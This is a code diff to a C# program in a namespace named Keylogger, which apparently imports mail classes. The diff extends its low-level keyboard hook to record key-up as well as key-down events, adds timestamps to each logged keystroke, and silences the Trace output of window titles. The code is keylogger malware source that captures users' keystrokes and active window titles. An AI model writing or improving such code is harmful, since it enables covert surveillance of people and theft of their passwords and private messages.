@@ -10,6 +10,8 @@ using System.Threading;
 using System.Net.Mail;
 using System.Net;
 using System.Timers;
+using System.Linq;
+using System.Globalization;
 
 namespace Keylogger
 {
@@ -1101,7 +1103,7 @@ namespace Keylogger
             Int32 msgType = wParam.ToInt32();
             Int32 vKey;
             string key = "";
-            if (code >= 0 && (msgType == 0x100 || msgType == 0x104))
+            if (code >= 0 && (msgType == 0x100 || msgType == 0x101 || msgType == 0x104))
             {
                 bool shift = false;
                 IntPtr hWindow = GetForegroundWindow();
@@ -1450,6 +1452,24 @@ namespace Keylogger
                     }
                 }
 
+                #region ОБРАБОТЧИК ДЛЯ ЗАХВАТА СОБЫТИЙ ПО НАЖАТИЮ И ОТПУСКАНИЮ
+                if (msgType == 0x100)
+                {
+                    string timestamp = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture);
+                    key = String.Concat(key, ";(Down);", timestamp, "\r\n");
+                }
+                else if(msgType == 0x101)
+                {
+                    string timestamp = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture);
+                    key = String.Concat(key, ";(Up);", timestamp, "\r\n");
+                }
+                else
+                {
+                    string timestamp = DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss.fff", CultureInfo.InvariantCulture);
+                    key = String.Concat(key, ";(System);", timestamp, "\r\n");
+                }
+                #endregion
+
                 StringBuilder title = new StringBuilder(256);
                 GetWindowText(hWindow, title, title.Capacity);
 
@@ -1464,14 +1484,10 @@ namespace Keylogger
                                             "Time    : " + props["Time"] + Environment.NewLine +
                                             "LogFile : " + Program.logName + Environment.NewLine +
                                             "----------------------------------------------";
-                    //Console.WriteLine();
-                    //Console.WriteLine();
-                    //Console.WriteLine(titleString);
-                    //Console.WriteLine();
-                    Trace.WriteLine("");
-                    Trace.WriteLine("");
-                    Trace.WriteLine(titleString);
-                    Trace.WriteLine("");
+                    //Trace.WriteLine("");
+                    //Trace.WriteLine("");
+                    //Trace.WriteLine(titleString);
+                    //Trace.WriteLine("");
                     // Write to file
                     Program.lastTitle = props["Window"];
                 }
